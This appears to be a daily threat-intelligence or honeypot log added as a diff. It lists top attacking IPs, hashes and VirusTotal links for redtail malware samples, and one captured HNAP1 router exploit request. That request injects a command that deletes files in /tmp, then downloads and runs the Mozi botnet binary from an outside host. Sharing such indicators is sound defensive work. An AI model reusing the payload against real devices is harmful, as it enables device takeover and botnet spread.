@@ -1,0 +1,46 @@
+Top 5 IPs for 01-07-2024 :
+
+38.156.91.31
+103.96.151.81
+117.148.166.175
+82.207.8.242
+146.185.138.92
+
+Malware Observed:
+
+
+File name : clean.sh
+d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e
+https://www.virustotal.com/gui/file/d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e
+
+
+File name : redtail.arm7
+1897b34d2e24e1a37d961add5243ac247f709b3ab4b0967eb2e2cbc1aa86dc16
+https://www.virustotal.com/gui/file/1897b34d2e24e1a37d961add5243ac247f709b3ab4b0967eb2e2cbc1aa86dc16
+
+
+File name : redtail.arm8
+d92990b37ba580266b4a724f1eae9c8f00c0872f8aa981ce9b64dc8df8a0744b
+https://www.virustotal.com/gui/file/d92990b37ba580266b4a724f1eae9c8f00c0872f8aa981ce9b64dc8df8a0744b
+
+
+File name : redtail.i686
+f04e075e655a31cd4cb416583327b6fb4db2a0de66c4d873ae3c6acf95dc4e0f
+https://www.virustotal.com/gui/file/f04e075e655a31cd4cb416583327b6fb4db2a0de66c4d873ae3c6acf95dc4e0f
+
+
+File name : redtail.x86_64
+7db527e1b4a95c2d8cd94201cb19bf819d2c52d3bab9e558124e0d32a7f38200
+https://www.virustotal.com/gui/file/7db527e1b4a95c2d8cd94201cb19bf819d2c52d3bab9e558124e0d32a7f38200
+
+
+
+Commands/exploits observed:
+
+POST /HNAP1/ HTTP/1.0
+Host: <Host IP>
+Content-Type: text/xml; charset="utf-8"
+SOAPAction: http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://103.197.113.232:34331/Mozi.m && chmod 777 /tmp/Mozi.m && /tmp/Mozi.m`
+Content-Length: 640
+
+<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><AddPortMapping xmlns="http://purenetworks.com/HNAP1/"><PortMappingDescription>foobar</PortMappingDescription><InternalClient>192.168.0.100</InternalClient><PortMappingProtocol>TCP</PortMappingProtocol><ExternalPort>1234</ExternalPort><InternalPort>1234</InternalPort></AddPortMapping></soap:Body></soap:Envelope>
